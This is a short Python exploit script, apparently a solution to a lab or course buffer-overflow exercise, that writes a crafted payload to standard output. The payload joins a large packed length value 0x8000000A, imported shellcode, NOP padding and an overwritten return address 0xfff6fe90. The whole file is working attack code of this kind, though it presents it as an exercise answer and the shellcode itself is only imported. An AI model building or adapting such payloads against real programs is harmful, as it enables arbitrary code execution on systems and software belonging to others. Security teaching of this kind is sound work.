import sys
from struct import pack
from shellcode import shellcode

# Implement your attack here!
payload = pack("<I", 0xfff6fe90)
nops = b'\x90' * (92 - len(shellcode))


# Launch the attack!
sys.stdout.buffer.write(pack("<I", 0x8000000A) + shellcode + nops + payload)
